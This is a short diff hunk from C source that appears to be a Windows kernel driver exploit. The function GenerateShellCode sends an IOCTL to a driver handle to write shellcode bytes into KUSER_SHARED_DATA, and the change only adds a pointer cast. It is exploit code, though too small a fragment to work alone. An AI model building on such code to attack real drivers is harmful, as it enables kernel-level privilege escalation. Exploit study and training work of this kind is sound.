@@ -299,7 +299,7 @@ void *GenerateShellCode(HANDLE driverHandle)
     
     printf("[+] Shellcode is located at %p\n",KUSER_SHARED_DATA );
 
-    SendToDriver(driverHandle,0x0022200B,0x909090C3,KUSER_SHARED_DATA);
+    SendToDriver(driverHandle,0x0022200B,(void*)0x909090C3,KUSER_SHARED_DATA);
 
     return KUSER_SHARED_DATA;
 }
